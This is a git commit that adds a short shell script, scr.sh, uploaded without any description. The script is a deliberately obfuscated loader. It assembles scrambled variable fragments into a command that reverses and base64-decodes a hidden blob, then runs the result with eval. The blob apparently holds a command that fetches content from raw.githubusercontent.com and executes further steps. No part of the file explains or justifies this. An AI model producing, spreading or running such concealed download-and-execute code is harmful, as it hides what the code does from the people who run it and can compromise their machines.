be3351ff2e0dd1988409e4047e28201f1bf2db11
paypayler <43097491+paypayler@users.noreply.github.com>
2019-01-04 21:52:35 +0200

    Add files via upload

---
+++ scr.sh
@@ -0,0 +1,5 @@
+gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '=ogIl52bEJCIvh2YlpgCoJXYgYmctASbypgLuACZjpgCoNnLyA3bjVGel9iLKg2cuQ3clR3YlhXZv4yIKoAbsVnbvYXZk9iPxACcppnLlZXaoJXYgkSMm1CIiAiIgQWLgQXdjBCfgU3LzADM4QDIwVmcnBCfgMXZjlmdyV2cvMGdl9CI0F2YoQCIQ1CIwlmeuVnCKACcppnLlZXaoJXYvIXZ0NXYt9SY0FGZvIXZslXYwlXYw9SbvNmL05WZ052bjJXZzVnY1hGdpdmL3Fmcv8iOzBHd0hGIP1CIz1CIsJXdjpAayFGIkNmCoJXYgIXaktWbKg2chJ2LulmYvEyI
+' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
+x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
+eval "$N0q$x$Hc2$rQW"
+
